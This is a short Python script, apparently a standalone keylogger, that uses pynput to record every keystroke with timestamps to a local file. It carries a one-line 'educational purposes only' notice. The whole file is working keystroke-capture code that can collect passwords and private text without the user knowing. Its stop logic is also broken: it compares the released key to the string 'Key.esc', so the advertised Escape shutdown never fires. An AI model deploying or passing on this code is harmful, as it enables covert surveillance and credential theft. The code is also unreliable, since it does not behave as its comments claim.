from pynput.keyboard import Listener
import logging

log_file = "key_log.txt"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

def on_press(key):
    """
    Callback function triggered when a key is pressed.
    Logs the key to the log file.
    """
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """
    Callback function triggered when a key is released.
    Stops the keylogger if the Escape key is pressed.
    """
    if key == "Key.esc":
        return False
    
if __name__ == "__main__":
    print("Keylogger is running... Press 'Escape' to stop.")
    print("This program is for educational purposes only. Ensure you have explicit permission to use it.")
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
